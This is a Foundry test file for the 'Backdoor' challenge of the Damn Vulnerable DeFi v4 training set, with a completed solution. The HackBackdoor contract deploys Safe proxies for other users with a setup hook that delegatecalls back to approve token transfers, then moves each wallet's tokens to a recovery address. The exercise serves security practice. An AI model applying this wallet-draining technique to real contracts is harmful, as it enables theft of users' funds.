// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";

contract BackdoorChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");
    address[] users = [makeAddr("alice"), makeAddr("bob"), makeAddr("charlie"), makeAddr("david")];

    uint256 constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;

    DamnValuableToken token;
    Safe singletonCopy;
    SafeProxyFactory walletFactory;
    WalletRegistry walletRegistry;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Deploy Safe copy and factory
        singletonCopy = new Safe();
        walletFactory = new SafeProxyFactory();

        // Deploy reward token
        token = new DamnValuableToken();

        // Deploy the registry
        walletRegistry = new WalletRegistry(address(singletonCopy), address(walletFactory), address(token), users);

        // Transfer tokens to be distributed to the registry
        token.transfer(address(walletRegistry), AMOUNT_TOKENS_DISTRIBUTED);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(walletRegistry.owner(), deployer);
        assertEq(token.balanceOf(address(walletRegistry)), AMOUNT_TOKENS_DISTRIBUTED);
        for (uint256 i = 0; i < users.length; i++) {
            // Users are registered as beneficiaries
            assertTrue(walletRegistry.beneficiaries(users[i]));

            // User cannot add beneficiaries
            vm.expectRevert(bytes4(hex"82b42900")); // `Unauthorized()`
            vm.prank(users[i]);
            walletRegistry.addBeneficiary(users[i]);
        }
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_backdoor() public checkSolvedByPlayer {
        // walletRegistry.createProxyWithCallback(_singleton, initializer, saltNonce, callback);
        // console.log(token.balanceOf(address(walletRegistry)));
        HackBackdoor exploit = new HackBackdoor(address(singletonCopy), walletFactory, walletRegistry, token, recovery);
        exploit.attack(users);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        for (uint256 i = 0; i < users.length; i++) {
            address wallet = walletRegistry.wallets(users[i]);

            // User must have registered a wallet
            assertTrue(wallet != address(0), "User didn't register a wallet");

            // User is no longer registered as a beneficiary
            assertFalse(walletRegistry.beneficiaries(users[i]));
        }

        // Recovery account must own all tokens
        assertEq(token.balanceOf(recovery), AMOUNT_TOKENS_DISTRIBUTED);
    }
}

import {
    SafeProxy,
    IProxyCreationCallback
} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";

contract HackBackdoor {
    address singletonCopy;
    DamnValuableToken immutable i_dvt; // it is important to be immutable for delegate call
    address recovery;
    SafeProxyFactory walletFactory;
    SafeProxy proxy;
    WalletRegistry walletRegistry;
    address immutable i_HackBackdoorAddr; // it is important to be immutable for delegate call

    constructor(
        address _singletonCopy,
        SafeProxyFactory _walletFactory,
        WalletRegistry _walletRegistry,
        DamnValuableToken _token,
        address _recovery
    ) {
        singletonCopy = _singletonCopy;
        walletFactory = _walletFactory;
        walletRegistry = _walletRegistry;
        i_dvt = _token;
        recovery = _recovery;
        i_HackBackdoorAddr = address(this);
    }

    function attack(address[] memory _beneficiaries) external {
        for (uint256 i = 0; i < 4; i++) {
            address[] memory beneficiary = new address[](1);
            beneficiary[0] = _beneficiaries[i];

            bytes memory initializer = abi.encodeWithSelector(
                Safe.setup.selector,
                beneficiary,
                1,
                address(this),
                abi.encodeWithSelector(this.delegateFromCreatedProxy.selector),
                address(0),
                0,
                0,
                0
            );

            // Create new proxies on behalf of other users
            proxy = walletFactory.createProxyWithCallback(singletonCopy, initializer, i, walletRegistry);
            //Transfer to caller
            i_dvt.transferFrom(address(proxy), recovery, 10 ether);
        }
    }

    function delegateFromCreatedProxy() external {
        i_dvt.approve(i_HackBackdoorAddr, 10 ether);
    }
}

